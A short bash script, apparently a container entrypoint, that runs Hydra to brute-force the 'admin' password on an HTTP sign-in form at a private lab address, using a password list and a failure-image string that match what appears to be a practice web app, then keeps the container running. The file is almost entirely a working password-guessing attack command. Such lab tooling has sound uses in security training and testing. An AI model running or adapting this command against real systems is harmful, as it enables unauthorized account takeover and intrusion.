#!/bin/bash

# Example Hydra command, replace it with your actual command
hydra -l admin -P /passwords.txt -F -o hydra.log 192.168.56.101 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
# Keep the container running after the Hydra command finishes
# This line can be removed if you don't need the container to stay up
tail -f /dev/null
